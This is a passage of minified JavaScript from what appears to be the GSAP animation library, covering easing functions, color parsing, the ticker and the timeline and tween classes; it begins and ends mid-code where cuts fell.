r,i,a,o,s,l,c,u,d,p,h,f,A,m,v,g,y,b,_,w,C,x,S,k,M,B,E={autoSleep:120,force3D:"auto",nullTargetWarn:1,units:{lineHeight:""}},T={duration:.5,overwrite:!1,delay:0},P=1e-8,I=2*Math.PI,F=I/4,L=0,O=Math.sqrt,N=Math.cos,D=Math.sin,R=function(e){return"string"==typeof e},j=function(e){return"function"==typeof e},U=function(e){return"number"==typeof e},$=function(e){return void 0===e},z=function(e){return"object"===_typeof2(e)},H=function(e){return!1!==e},V=function(){return"undefined"!=typeof window},Q=function(e){return j(e)||R(e)},G="function"==typeof ArrayBuffer&&ArrayBuffer.isView||function(){},W=Array.isArray,K=/(?:-?\.?\d|\.)+/gi,q=/[-+=.]*\d+[.e\-+]*\d*[e\-+]*\d*/g,X=/[-+=.]*\d+[.e-]*\d*[a-z%]*/g,Y=/[-+=.]*\d+\.?\d*(?:e-|e\+)?\d*/gi,J=/[+-]=-?[.\d]+/,Z=/[#\-+.]*\b[a-z\d-=+%.]+/gi,ee=/[\d.+\-=]+(?:e[-+]\d*)*/i,te={},ne={},re=function(e){return(ne=Be(e,te))&&on},ie=function(e,t){return!t&&void 0},ae=function(e,t){return e&&(te[e]=t)&&ne&&(ne[e]=t)||te},oe=function(){return 0},se={},le=[],ce={},ue={},de={},pe=30,he=[],fe="",Ae=function(e){var t,n,r=e[0];if(z(r)||j(r)||(e=[e]),!(t=(r._gsap||{}).harness)){for(n=he.length;n--&&!he[n].targetTest(r););t=he[n]}for(n=e.length;n--;)e[n]&&(e[n]._gsap||(e[n]._gsap=new Pt(e[n],t)))||e.splice(n,1);return e},me=function(e){return e._gsap||Ae(Ze(e))[0]._gsap},ve=function(e,t,n){return(n=e[t])&&j(n)?e[t]():$(n)&&e.getAttribute&&e.getAttribute(t)||n},ge=function(e,t){return(e=e.split(",")).forEach(t)||e},ye=function(e){return Math.round(1e5*e)/1e5||0},be=function(e,t){for(var n=t.length,r=0;e.indexOf(t[r])<0&&++r<n;);return r<n},_e=function(e,t,n){var r,i=U(e[1]),a=(i?2:1)+(t<2?0:1),o=e[a];if(i&&(o.duration=e[1]),o.parent=n,t){for(r=o;n&&!("immediateRender"in r);)r=n.vars.defaults||{},n=H(n.vars.inherit)&&n.parent;o.immediateRender=H(r.immediateRender),t<2?o.runBackwards=1:o.startAt=e[a-1]}return o},we=function(){var e,t,n=le.length,r=le.slice(0);for(ce={},e=le.length=0;e<n;e++)(t=r[e])&&t._lazy&&(t.render(t._lazy[0],t._lazy[1],!0)._lazy=0)},Ce=function(e,t,n,r){le.length&&we(),e.render(t,n,r),le.length&&we()},xe=function(e){var t=parseFloat(e);return(t||0===t)&&(e+"").match(Z).length<2?t:R(e)?e.trim():e},Se=function(e){return e},ke=function(e,t){for(var n in t)n in e||(e[n]=t[n]);return e},Me=function(e,t){for(var n in t)n in e||"duration"===n||"ease"===n||(e[n]=t[n])},Be=function(e,t){for(var n in t)e[n]=t[n];return e},Ee=function e(t,n){for(var r in n)"__proto__"!==r&&"constructor"!==r&&"prototype"!==r&&(t[r]=z(n[r])?e(t[r]||(t[r]={}),n[r]):n[r]);return t},Te=function(e,t){var n,r={};for(n in e)n in t||(r[n]=e[n]);return r},Pe=function(e){var t=e.parent||i,n=e.keyframes?Me:ke;if(H(e.inherit))for(;t;)n(e,t.vars.defaults),t=t.parent||t._dp;return e},Ie=function(e,t,n,r){void 0===n&&(n="_first"),void 0===r&&(r="_last");var i=t._prev,a=t._next;i?i._next=a:e[n]===t&&(e[n]=a),a?a._prev=i:e[r]===t&&(e[r]=i),t._next=t._prev=t.parent=null},Fe=function(e,t){e.parent&&(!t||e.parent.autoRemoveChildren)&&e.parent.remove(e),e._act=0},Le=function(e,t){if(e&&(!t||t._end>e._dur||t._start<0))for(var n=e;n;)n._dirty=1,n=n.parent;return e},Oe=function(e){return e._repeat?Ne(e._tTime,e=e.duration()+e._rDelay)*e:0},Ne=function(e,t){var n=Math.floor(e/=t);return e&&n===e?n-1:n},De=function(e,t){return(e-t._start)*t._ts+(0<=t._ts?0:t._dirty?t.totalDuration():t._tDur)},Re=function(e){return e._end=ye(e._start+(e._tDur/Math.abs(e._ts||e._rts||P)||0))},je=function(e,t){var n=e._dp;return n&&n.smoothChildTiming&&e._ts&&(e._start=ye(n._time-(0<e._ts?t/e._ts:((e._dirty?e.totalDuration():e._tDur)-t)/-e._ts)),Re(e),n._dirty||Le(n,e)),e},Ue=function(e,t){var n;if((t._time||t._initted&&!t._dur)&&(n=De(e.rawTime(),t),(!t._dur||qe(0,t.totalDuration(),n)-t._tTime>P)&&t.render(n,!0)),Le(e,t)._dp&&e._initted&&e._time>=e._dur&&e._ts){if(e._dur<e.duration())for(n=e;n._dp;)0<=n.rawTime()&&n.totalTime(n._tTime),n=n._dp;e._zTime=-P}},$e=function(e,t,n,r){return t.parent&&Fe(t),t._start=ye(n+t._delay),t._end=ye(t._start+(t.totalDuration()/Math.abs(t.timeScale())||0)),function(e,t,n,r,i){void 0===n&&(n="_first"),void 0===r&&(r="_last");var a,o=e[r];if(i)for(a=t[i];o&&o[i]>a;)o=o._prev;o?(t._next=o._next,o._next=t):(t._next=e[n],e[n]=t),t._next?t._next._prev=t:e[r]=t,t._prev=o,t.parent=t._dp=e}(e,t,"_first","_last",e._sort?"_start":0),e._recent=t,r||Ue(e,t),e},ze=function(e,t){return te.ScrollTrigger?te.ScrollTrigger.create(t,e):void 0},He=function(e,t,n,r){return Dt(e,t),e._initted?!n&&e._pt&&(e._dur&&!1!==e.vars.lazy||!e._dur&&e.vars.lazy)&&c!==yt.frame?(le.push(e),e._lazy=[t,r],1):void 0:1},Ve=function(e,t,n,r){var i=e._repeat,a=ye(t)||0,o=e._tTime/e._tDur;return o&&!r&&(e._time*=a/e._dur),e._dur=a,e._tDur=i?i<0?1e10:ye(a*(i+1)+e._rDelay*i):a,o&&!r?je(e,e._tTime=e._tDur*o):e.parent&&Re(e),n||Le(e.parent,e),e},Qe=function(e){return e instanceof Ft?Le(e):Ve(e,e._dur)},Ge={_start:0,endTime:oe},We=function e(t,n){var r,i,a=t.labels,o=t._recent||Ge,s=1e8<=t.duration()?o.endTime(!1):t._dur;return R(n)&&(isNaN(n)||n in a)?"<"===(r=n.charAt(0))||">"===r?("<"===r?o._start:o.endTime(0<=o._repeat))+(parseFloat(n.substr(1))||0):(r=n.indexOf("="))<0?(n in a||(a[n]=s),a[n]):(i=+(n.charAt(r-1)+n.substr(r+1)),1<r?e(t,n.substr(0,r-1))+i:s+i):null==n?s:+n},Ke=function(e,t){return e||0===e?t(e):t},qe=function(e,t,n){return n<e?e:t<n?t:n},Xe=function(e){if("string"!=typeof e)return"";var t=ee.exec(e);return t?e.substr(t.index+t[0].length):""},Ye=[].slice,Je=function(e,t){return e&&z(e)&&"length"in e&&(!t&&!e.length||e.length-1 in e&&z(e[0]))&&!e.nodeType&&e!==a},Ze=function(e,t){return!R(e)||t||!o&&bt()?W(e)?(n=t,void 0===r&&(r=[]),e.forEach((function(e){var t;return R(e)&&!n||Je(e,1)?(t=r).push.apply(t,Ze(e)):r.push(e)}))||r):Je(e)?Ye.call(e,0):e?[e]:[]:Ye.call(s.querySelectorAll(e),0);var n,r},et=function(e){return e.sort((function(){return.5-Math.random()}))},tt=function(e){if(j(e))return e;var t=z(e)?e:{each:e},n=kt(t.ease),r=t.from||0,i=parseFloat(t.base)||0,a={},o=0<r&&r<1,s=isNaN(r)||o,l=t.axis,c=r,u=r;return R(r)?c=u={center:.5,edges:.5,end:1}[r]||0:!o&&s&&(c=r[0],u=r[1]),function(e,o,d){var p,h,f,A,m,v,g,y,b,_=(d||t).length,w=a[_];if(!w){if(!(b="auto"===t.grid?0:(t.grid||[1,1e8])[1])){for(g=-1e8;g<(g=d[b++].getBoundingClientRect().left)&&b<_;);b--}for(w=a[_]=[],p=s?Math.min(b,_)*c-.5:r%b,h=s?_*u/b-.5:r/b|0,y=1e8,v=g=0;v<_;v++)f=v%b-p,A=h-(v/b|0),w[v]=m=l?Math.abs("y"===l?A:f):O(f*f+A*A),g<m&&(g=m),m<y&&(y=m);"random"===r&&et(w),w.max=g-y,w.min=y,w.v=_=(parseFloat(t.amount)||parseFloat(t.each)*(_<b?_-1:l?"y"===l?_/b:b:Math.max(b,_/b))||0)*("edges"===r?-1:1),w.b=_<0?i-_:i,w.u=Xe(t.amount||t.each)||0,n=n&&_<0?xt(n):n}return _=(w[e]-w.min)/w.max||0,ye(w.b+(n?n(_):_)*w.v)+w.u}},nt=function(e){var t=e<1?Math.pow(10,(e+"").length-2):1;return function(n){var r=Math.round(parseFloat(n)/e)*e*t;return(r-r%1)/t+(U(n)?0:Xe(n))}},rt=function(e,t){var n,r,i=W(e);return!i&&z(e)&&(n=i=e.radius||1e8,e.values?(e=Ze(e.values),(r=!U(e[0]))&&(n*=n)):e=nt(e.increment)),Ke(t,i?j(e)?function(t){return r=e(t),Math.abs(r-t)<=n?r:t}:function(t){for(var i,a,o=parseFloat(r?t.x:t),s=parseFloat(r?t.y:0),l=1e8,c=0,u=e.length;u--;)(i=r?(i=e[u].x-o)*i+(a=e[u].y-s)*a:Math.abs(e[u]-o))<l&&(l=i,c=u);return c=!n||l<=n?e[c]:t,r||c===t||U(t)?c:c+Xe(t)}:nt(e))},it=function(e,t,n,r){return Ke(W(e)?!t:!0===n?!!(n=0):!r,(function(){return W(e)?e[~~(Math.random()*e.length)]:(n=n||1e-5)&&(r=n<1?Math.pow(10,(n+"").length-2):1)&&Math.floor(Math.round((e-n/2+Math.random()*(t-e+.99*n))/n)*n*r)/r}))},at=function(e,t,n){return Ke(n,(function(n){return e[~~t(n)]}))},ot=function(e){for(var t,n,r,i,a=0,o="";~(t=e.indexOf("random(",a));)r=e.indexOf(")",t),i="["===e.charAt(t+7),n=e.substr(t+7,r-t-7).match(i?Z:K),o+=e.substr(a,t-a)+it(i?n:+n[0],i?0:+n[1],+n[2]||1e-5),a=r+1;return o+e.substr(a,e.length-a)},st=function(e,t,n,r,i){var a=t-e,o=r-n;return Ke(i,(function(t){return n+((t-e)/a*o||0)}))},lt=function(e,t,n){var r,i,a,o=e.labels,s=1e8;for(r in o)(i=o[r]-t)<0==!!n&&i&&s>(i=Math.abs(i))&&(a=r,s=i);return a},ct=function(e,t,n){var r,i,a=e.vars,o=a[t];if(o)return r=a[t+"Params"],i=a.callbackScope||e,n&&le.length&&we(),r?o.apply(i,r):o.call(i)},ut=function(e){return Fe(e),e.progress()<1&&ct(e,"onInterrupt"),e},dt={aqua:[0,255,255],lime:[0,255,0],silver:[192,192,192],black:[0,0,0],maroon:[128,0,0],teal:[0,128,128],blue:[0,0,255],navy:[0,0,128],white:[255,255,255],olive:[128,128,0],yellow:[255,255,0],orange:[255,165,0],gray:[128,128,128],purple:[128,0,128],green:[0,128,0],red:[255,0,0],pink:[255,192,203],cyan:[0,255,255],transparent:[255,255,255,0]},pt=function(e,t,n){return 255*(6*(e=e<0?e+1:1<e?e-1:e)<1?t+(n-t)*e*6:e<.5?n:3*e<2?t+(n-t)*(2/3-e)*6:t)+.5|0},ht=function(e,t,n){var r,i,a,o,s,l,c,u,d,p,h=e?U(e)?[e>>16,e>>8&255,255&e]:0:dt.black;if(!h){if(","===e.substr(-1)&&(e=e.substr(0,e.length-1)),dt[e])h=dt[e];else if("#"===e.charAt(0)){if(e.length<6&&(e="#"+(r=e.charAt(1))+r+(i=e.charAt(2))+i+(a=e.charAt(3))+a+(5===e.length?e.charAt(4)+e.charAt(4):"")),9===e.length)return[(h=parseInt(e.substr(1,6),16))>>16,h>>8&255,255&h,parseInt(e.substr(7),16)/255];h=[(e=parseInt(e.substr(1),16))>>16,e>>8&255,255&e]}else if("hsl"===e.substr(0,3))if(h=p=e.match(K),t){if(~e.indexOf("="))return h=e.match(q),n&&h.length<4&&(h[3]=1),h}else o=+h[0]%360/360,s=+h[1]/100,r=2*(l=+h[2]/100)-(i=l<=.5?l*(s+1):l+s-l*s),3<h.length&&(h[3]*=1),h[0]=pt(o+1/3,r,i),h[1]=pt(o,r,i),h[2]=pt(o-1/3,r,i);else h=e.match(K)||dt.transparent;h=h.map(Number)}return t&&!p&&(r=h[0]/255,i=h[1]/255,a=h[2]/255,l=((c=Math.max(r,i,a))+(u=Math.min(r,i,a)))/2,c===u?o=s=0:(d=c-u,s=.5<l?d/(2-c-u):d/(c+u),o=c===r?(i-a)/d+(i<a?6:0):c===i?(a-r)/d+2:(r-i)/d+4,o*=60),h[0]=~~(o+.5),h[1]=~~(100*s+.5),h[2]=~~(100*l+.5)),n&&h.length<4&&(h[3]=1),h},ft=function(e){var t=[],n=[],r=-1;return e.split(mt).forEach((function(e){var i=e.match(X)||[];t.push.apply(t,i),n.push(r+=i.length+1)})),t.c=n,t},At=function(e,t,n){var r,i,a,o,s="",l=(e+s).match(mt),c=t?"hsla(":"rgba(",u=0;if(!l)return e;if(l=l.map((function(e){return(e=ht(e,t,1))&&c+(t?e[0]+","+e[1]+"%,"+e[2]+"%,"+e[3]:e.join(","))+")"})),n&&(a=ft(e),(r=n.c).join(s)!==a.c.join(s)))for(o=(i=e.replace(mt,"1").split(X)).length-1;u<o;u++)s+=i[u]+(~r.indexOf(u)?l.shift()||c+"0,0,0,0)":(a.length?a:l.length?l:n).shift());if(!i)for(o=(i=e.split(mt)).length-1;u<o;u++)s+=i[u]+l[u];return s+i[o]},mt=function(){var e,t="(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3,4}){1,2}\\b";for(e in dt)t+="|"+e+"\\b";return new RegExp(t+")","gi")}(),vt=/hsl[a]?\(/,gt=function(e){var t,n=e.join(" ");if(mt.lastIndex=0,mt.test(n))return t=vt.test(n),e[1]=At(e[1],t),e[0]=At(e[0],t,ft(e[1])),!0},yt=(g=Date.now,y=500,b=33,_=g(),w=_,x=C=1e3/240,k=function e(t){var n,r,i,a,o=g()-w,s=!0===t;if(y<o&&(_+=o-b),(0<(n=(i=(w+=o)-_)-x)||s)&&(a=++A.frame,m=i-1e3*A.time,A.time=i/=1e3,x+=n+(C<=n?4:C-n),r=1),s||(p=h(e)),r)for(v=0;v<S.length;v++)S[v](i,m,a,t)},A={time:0,frame:0,tick:function(){k(!0)},deltaRatio:function(e){return m/(1e3/(e||60))},wake:function(){l&&(!o&&V()&&(a=o=window,s=a.document||{},te.gsap=on,(a.gsapVersions||(a.gsapVersions=[])).push(on.version),re(ne||a.GreenSockGlobals||!a.gsap&&a||{}),f=a.requestAnimationFrame),p&&A.sleep(),h=f||function(e){return setTimeout(e,x-1e3*A.time+1|0)},d=1,k(2))},sleep:function(){(f?a.cancelAnimationFrame:clearTimeout)(p),d=0,h=oe},lagSmoothing:function(e,t){y=e||1e8,b=Math.min(t,y,0)},fps:function(e){C=1e3/(e||240),x=1e3*A.time+C},add:function(e){S.indexOf(e)<0&&S.push(e),bt()},remove:function(e){var t;~(t=S.indexOf(e))&&S.splice(t,1)&&t<=v&&v--},_listeners:S=[]}),bt=function(){return!d&&yt.wake()},_t={},wt=/^[\d.\-M][\d.\-,\s]/,Ct=/["']/g,xt=function(e){return function(t){return 1-e(1-t)}},St=function e(t,n){for(var r,i=t._first;i;)i instanceof Ft?e(i,n):!i.vars.yoyoEase||i._yoyo&&i._repeat||i._yoyo===n||(i.timeline?e(i.timeline,n):(r=i._ease,i._ease=i._yEase,i._yEase=r,i._yoyo=n)),i=i._next},kt=function(e,t){return e&&(j(e)?e:_t[e]||function(e){var t,n,r,i,a=(e+"").split("("),o=_t[a[0]];return o&&1<a.length&&o.config?o.config.apply(null,~e.indexOf("{")?[function(e){for(var t,n,r,i={},a=e.substr(1,e.length-3).split(":"),o=a[0],s=1,l=a.length;s<l;s++)n=a[s],t=s!==l-1?n.lastIndexOf(","):n.length,r=n.substr(0,t),i[o]=isNaN(r)?r.replace(Ct,"").trim():+r,o=n.substr(t+1).trim();return i}(a[1])]:(t=e,n=t.indexOf("(")+1,r=t.indexOf(")"),i=t.indexOf("(",n),t.substring(n,~i&&i<r?t.indexOf(")",r+1):r)).split(",").map(xe)):_t._CE&&wt.test(e)?_t._CE("",e):o}(e))||t},Mt=function(e,t,n,r){void 0===n&&(n=function(e){return 1-t(1-e)}),void 0===r&&(r=function(e){return e<.5?t(2*e)/2:1-t(2*(1-e))/2});var i,a={easeIn:t,easeOut:n,easeInOut:r};return ge(e,(function(e){for(var t in _t[e]=te[e]=a,_t[i=e.toLowerCase()]=n,a)_t[i+("easeIn"===t?".in":"easeOut"===t?".out":".inOut")]=_t[e+"."+t]=a[t]})),a},Bt=function(e){return function(t){return t<.5?(1-e(1-2*t))/2:.5+e(2*(t-.5))/2}},Et=function e(t,n,r){var i=1<=n?n:1,a=(r||(t?.3:.45))/(n<1?n:1),o=a/I*(Math.asin(1/i)||0),s=function(e){return 1===e?1:i*Math.pow(2,-10*e)*D((e-o)*a)+1},l="out"===t?s:"in"===t?function(e){return 1-s(1-e)}:Bt(s);return a=I/a,l.config=function(n,r){return e(t,n,r)},l},Tt=function e(t,n){void 0===n&&(n=1.70158);var r=function(e){return e?--e*e*((n+1)*e+n)+1:0},i="out"===t?r:"in"===t?function(e){return 1-r(1-e)}:Bt(r);return i.config=function(n){return e(t,n)},i};ge("Linear,Quad,Cubic,Quart,Quint,Strong",(function(e,t){var n=t<5?t+1:t;Mt(e+",Power"+(n-1),t?function(e){return Math.pow(e,n)}:function(e){return e},(function(e){return 1-Math.pow(1-e,n)}),(function(e){return e<.5?Math.pow(2*e,n)/2:1-Math.pow(2*(1-e),n)/2}))})),_t.Linear.easeNone=_t.none=_t.Linear.easeIn,Mt("Elastic",Et("in"),Et("out"),Et()),M=7.5625,Mt("Bounce",(function(e){return 1-B(1-e)}),B=function(e){return e<1/2.75?M*e*e:e<1/2.75*2?M*Math.pow(e-1.5/2.75,2)+.75:e<1/2.75*2.5?M*(e-=2.25/2.75)*e+.9375:M*Math.pow(e-2.625/2.75,2)+.984375}),Mt("Expo",(function(e){return e?Math.pow(2,10*(e-1)):0})),Mt("Circ",(function(e){return-(O(1-e*e)-1)})),Mt("Sine",(function(e){return 1===e?1:1-N(e*F)})),Mt("Back",Tt("in"),Tt("out"),Tt()),_t.SteppedEase=_t.steps=te.SteppedEase={config:function(e,t){void 0===e&&(e=1);var n=1/e,r=e+(t?0:1),i=t?1:0;return function(e){return((r*qe(0,.99999999,e)|0)+i)*n}}},T.ease=_t["quad.out"],ge("onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt",(function(e){return fe+=e+","+e+"Params,"}));var Pt=function(e,t){this.id=L++,(e._gsap=this).target=e,this.harness=t,this.get=t?t.get:ve,this.set=t?t.getSetter:Gt},It=function(){function e(e,t){var n=e.parent||i;this.vars=e,this._delay=+e.delay||0,(this._repeat=e.repeat===1/0?-2:e.repeat||0)&&(this._rDelay=e.repeatDelay||0,this._yoyo=!!e.yoyo||!!e.yoyoEase),this._ts=1,Ve(this,+e.duration,1,1),this.data=e.data,d||yt.wake(),n&&$e(n,this,t||0===t?t:n._time,1),e.reversed&&this.reverse(),e.paused&&this.paused(!0)}var t=e.prototype;return t.delay=function(e){return e||0===e?(this.parent&&this.parent.smoothChildTiming&&this.startTime(this._start+e-this._delay),this._delay=e,this):this._delay},t.duration=function(e){return arguments.length?this.totalDuration(0<this._repeat?e+(e+this._rDelay)*this._repeat:e):this.totalDuration()&&this._dur},t.totalDuration=function(e){return arguments.length?(this._dirty=0,Ve(this,this._repeat<0?e:(e-this._repeat*this._rDelay)/(this._repeat+1))):this._tDur},t.totalTime=function(e,t){if(bt(),!arguments.length)return this._tTime;var n=this._dp;if(n&&n.smoothChildTiming&&this._ts){for(je(this,e),!n._dp||n.parent||Ue(n,this);n.parent;)n.parent._time!==n._start+(0<=n._ts?n._tTime/n._ts:(n.totalDuration()-n._tTime)/-n._ts)&&n.totalTime(n._tTime,!0),n=n.parent;!this.parent&&this._dp.autoRemoveChildren&&(0<this._ts&&e<this._tDur||this._ts<0&&0<e||!this._tDur&&!e)&&$e(this._dp,this,this._start-this._delay)}return(this._tTime!==e||!this._dur&&!t||this._initted&&Math.abs(this._zTime)===P||!e&&!this._initted&&(this.add||this._ptLookup))&&(this._ts||(this._pTime=e),Ce(this,e,t)),this},t.time=function(e,t){return arguments.length?this.totalTime(Math.min(this.totalDuration(),e+Oe(this))%this._dur||(e?this._dur:0),t):this._time},t.totalProgress=function(e,t){return arguments.length?this.totalTime(this.totalDuration()*e,t):this.totalDuration()?Math.min(1,this._tTime/this._tDur):this.ratio},t.progress=function(e,t){return arguments.length?this.totalTime(this.duration()*(!this._yoyo||1&this.iteration()?e:1-e)+Oe(this),t):this.duration()?Math.min(1,this._time/this._dur):this.ratio},t.iteration=function(e,t){var n=this.duration()+this._rDelay;return arguments.length?this.totalTime(this._time+(e-1)*n,t):this._repeat?Ne(this._tTime,n)+1:1},t.timeScale=function(e){if(!arguments.length)return this._rts===-P?0:this._rts;if(this._rts===e)return this;var t=this.parent&&this._ts?De(this.parent._time,this):this._tTime;return this._rts=+e||0,this._ts=this._ps||e===-P?0:this._rts,function(e){for(var t=e.parent;t&&t.parent;)t._dirty=1,t.totalDuration(),t=t.parent;return e}(this.totalTime(qe(-this._delay,this._tDur,t),!0))},t.paused=function(e){return arguments.length?(this._ps!==e&&((this._ps=e)?(this._pTime=this._tTime||Math.max(-this._delay,this.rawTime()),this._ts=this._act=0):(bt(),this._ts=this._rts,this.totalTime(this.parent&&!this.parent.smoothChildTiming?this.rawTime():this._tTime||this._pTime,1===this.progress()&&(this._tTime-=P)&&Math.abs(this._zTime)!==P))),this):this._ps},t.startTime=function(e){if(arguments.length){this._start=e;var t=this.parent||this._dp;return t&&(t._sort||!this.parent)&&$e(t,this,e-this._delay),this}return this._start},t.endTime=function(e){return this._start+(H(e)?this.totalDuration():this.duration())/Math.abs(this._ts)},t.rawTime=function(e){var t=this.parent||this._dp;return t?e&&(!this._ts||this._repeat&&this._time&&this.totalProgress()<1)?this._tTime%(this._dur+this._rDelay):this._ts?De(t.rawTime(e),this):this._tTime:this._tTime},t.globalTime=function(e){for(var t=this,n=arguments.length?e:t.rawTime();t;)n=t._start+n/(t._ts||1),t=t._dp;return n},t.repeat=function(e){return arguments.length?(this._repeat=e===1/0?-2:e,Qe(this)):-2===this._repeat?1/0:this._repeat},t.repeatDelay=function(e){return arguments.length?(this._rDelay=e,Qe(this)):this._rDelay},t.yoyo=function(e){return arguments.length?(this._yoyo=e,this):this._yoyo},t.seek=function(e,t){return this.totalTime(We(this,e),H(t))},t.restart=function(e,t){return this.play().totalTime(e?-this._delay:0,H(t))},t.play=function(e,t){return null!=e&&this.seek(e,t),this.reversed(!1).paused(!1)},t.reverse=function(e,t){return null!=e&&this.seek(e||this.totalDuration(),t),this.reversed(!0).paused(!1)},t.pause=function(e,t){return null!=e&&this.seek(e,t),this.paused(!0)},t.resume=function(){return this.paused(!1)},t.reversed=function(e){return arguments.length?(!!e!==this.reversed()&&this.timeScale(-this._rts||(e?-P:0)),this):this._rts<0},t.invalidate=function(){return this._initted=this._act=0,this._zTime=-P,this},t.isActive=function(){var e,t=this.parent||this._dp,n=this._start;return!(t&&!(this._ts&&this._initted&&t.isActive()&&(e=t.rawTime(!0))>=n&&e<this.endTime(!0)-P))},t.eventCallback=function(e,t,n){var r=this.vars;return 1<arguments.length?(t?(r[e]=t,n&&(r[e+"Params"]=n),"onUpdate"===e&&(this._onUpdate=t)):delete r[e],this):r[e]},t.then=function(e){var t=this;return new Promise((function(n){var r=j(e)?e:Se,i=function(){var e=t.then;t.then=null,j(r)&&(r=r(t))&&(r.then||r===t)&&(t.then=e),n(r),t.then=e};t._initted&&1===t.totalProgress()&&0<=t._ts||!t._tTime&&t._ts<0?i():t._prom=i}))},t.kill=function(){ut(this)},e}();ke(It.prototype,{_time:0,_start:0,_end:0,_tTime:0,_tDur:0,_dirty:0,_repeat:0,_yoyo:!1,parent:null,_initted:!1,_rDelay:0,_ts:1,_dp:0,ratio:0,_zTime:-P,_prom:0,_ps:!1,_rts:1});var Ft=function(e){function r(t,r){var i;return void 0===t&&(t={}),(i=e.call(this,t,r)||this).labels={},i.smoothChildTiming=!!t.smoothChildTiming,i.autoRemoveChildren=!!t.autoRemoveChildren,i._sort=H(t.sortChildren),i.parent&&Ue(i.parent,n(i)),t.scrollTrigger&&ze(n(i),t.scrollTrigger),i}t(r,e);var a=r.prototype;return a.to=function(e,t,n){return new $t(e,_e(arguments,0,this),We(this,U(t)?arguments[3]:n)),this},a.from=function(e,t,n){return new $t(e,_e(arguments,1,this),We(this,U(t)?arguments[3]:n)),this},a.fromTo=function(e,t,n,r){return new $t(e,_e(arguments,2,this),We(this,U(t)?arguments[4]:r)),this},a.set=function(e,t,n){return t.duration=0,t.parent=this,Pe(t).repeatDelay||(t.repeat=0),t.immediateRender=!!t.immediateRender,new $t(e,t,We(this,n),1),this},a.call=function(e,t,n){return $e(this,$t.delayedCall(0,e,t),We(this,n))},a.staggerTo=function(e,t,n,r,i,a,o){return n.duration=t,n.stagger=n.stagger||r,n.onComplete=a,n.onCompleteParams=o,n.parent=this,new $t(e,n,We(this,i)),this},a.staggerFrom=function(e,t,n,r,i,a,o){return n.runBackwards=1,Pe(n).immediateRender=H(n.immediateRender),this.staggerTo(e,t,n,r,i,a,o)},a.staggerFromTo=function(e,t,n,r,i,a,o,s){return r.startAt=n,Pe(r).immediateRender=H(r.immediateRender),this.staggerTo(e,t,r,i,a,o,s)},a.render=function(e,t,n){var r,a,o,s,l,c,u,d,p,h,f,A,m=this._time,v=this._dirty?this.totalDuration():this._tDur,g=this._dur,y=this!==i&&v-P<e&&0<=e?v:e<P?0:e,b=this._zTime<0!=e<0&&(this._initted||!g);if(y!==this._tTime||n||b){if(m!==this._time&&g&&(y+=this._time-m,e+=this._time-m),r=y,p=this._start,c=!(d=this._ts),b&&(g||(m=this._zTime),(e||!t)&&(this._zTime=e)),this._repeat){if(f=this._yoyo,l=g+this._rDelay,this._repeat<-1&&e<0)return this.totalTime(100*l+e,t,n);if(r=ye(y%l),y===v?(s=this._repeat,r=g):((s=~~(y/l))&&s===y/l&&(r=g,s--),g<r&&(r=g)),h=Ne(this._tTime,l),!m&&this._tTime&&h!==s&&(h=s),f&&1&s&&(r=g-r,A=1),s!==h&&!this._lock){var _=f&&1&h,w=_===(f&&1&s);if(s<h&&(_=!_),m=_?0:g,this._lock=1,this.render(m||(A?0:ye(s*l)),t,!g)._lock=0,!t&&this.parent&&ct(this,"onRepeat"),this.vars.repeatRefresh&&!A&&(this.invalidate()._lock=1),m!==this._time||c!==!this._ts)return this;if(g=this._dur,v=this._tDur,w&&(this._lock=2,m=_?g:-1e-4,this.render(m,!0),this.vars.repeatRefresh&&!A&&this.invalidate()),this._lock=0,!this._ts&&!c)return this;St(this,A)}}if(this._hasPause&&!this._forcing&&this._lock<2&&(u=function(e,t,n){var r;if(t<n)for(r=e._first;r&&r._start<=n;){if(!r._dur&&"isPause"===r.data&&r._start>t)return r;r=r._next}else for(r=e._last;r&&r._start>=n;){if(!r._dur&&"isPause"===r.data&&r._start<t)return r;r=r._prev}}(this,ye(m),ye(r)))&&(y-=r-(r=u._start)),this._tTime=y,this._time=r,this._act=!d,this._initted||(this._onUpdate=this.vars.onUpdate,this._initted=1,this._zTime=e,m=0),!m&&(r||!g&&0<=e)&&!t&&ct(this,"onStart"),m<=r&&0<=e)for(a=this._first;a;){if(o=a._next,(a._act||r>=a._start)&&a._ts&&u!==a){if(a.parent!==this)return this.render(e,t,n);if(a.render(0<a._ts?(r-a._start)*a._ts:(a._dirty?a.totalDuration():a._tDur)+(r-a._start)*a._ts,t,n),r!==this._time||!this._ts&&!c){u=0,o&&(y+=this._zTime=-P);break}}a=o}else{a=this._last;for(var C=e<0?e:r;a;){if(o=a._prev,(a._act||C<=a._end)&&a._ts&&u!==a){if(a.parent!==this)return this.render(e,t,n);if(a.render(0<a._ts?(C-a._start)*a._ts:(a._dirty?a.totalDuration():a._tDur)+(C-a._start)*a._ts,t,n),r!==this._time||!this._ts&&!c){u=0,o&&(y+=this._zTime=C?-P:P);break}}a=o}}if(u&&!t&&(this.pause(),u.render(m<=r?0:-P)._zTime=m<=r?1:-1,this._ts))return this._start=p,Re(this),this.render(e,t,n);this._onUpdate&&!t&&ct(this,"onUpdate",!0),(y===v&&v>=this.totalDuration()||!y&&m)&&(p!==this._start&&Math.abs(d)===Math.abs(this._ts)||this._lock||((e||!g)&&(y===v&&0<this._ts||!y&&this._ts<0)&&Fe(this,1),t||e<0&&!m||!y&&!m||(ct(this,y===v?"onComplete":"onReverseComplete",!0),this._prom&&!(y<v&&0<this.timeScale())&&this._prom())))}return this},a.add=function(e,t){var n=this;if(U(t)||(t=We(this,t)),!(e instanceof It)){if(W(e))return e.forEach((function(e){return n.add(e,t)})),this;if(R(e))return this.addLabel(e,t);if(!j(e))return this;e=$t.delayedCall(0,e)}return this!==e?$e(this,e,t):this},a.getChildren=function(e,t,n,r){void 0===e&&(e=!0),void 0===t&&(t=!0),void 0===n&&(n=!0),void 0===r&&(r=-1e8);for(var i=[],a=this._first;a;)a._start>=r&&(a instanceof $t?t&&i.push(a):(n&&i.push(a),e&&i.push.apply(i,a.getChildren(!0,t,n)))),a=a._next;return i},a.getById=function(e){for(var t=this.getChildren(1,1,1),n=t.length;n--;)if(t[n].vars.id===e)return t[n]},a.remove=function(e){return R(e)?this.removeLabel(e):j(e)?this.killTweensOf(e):(Ie(this,e),e===this._recent&&(this._recent=this._last),Le(this))},a.totalTime=function(t,n){return 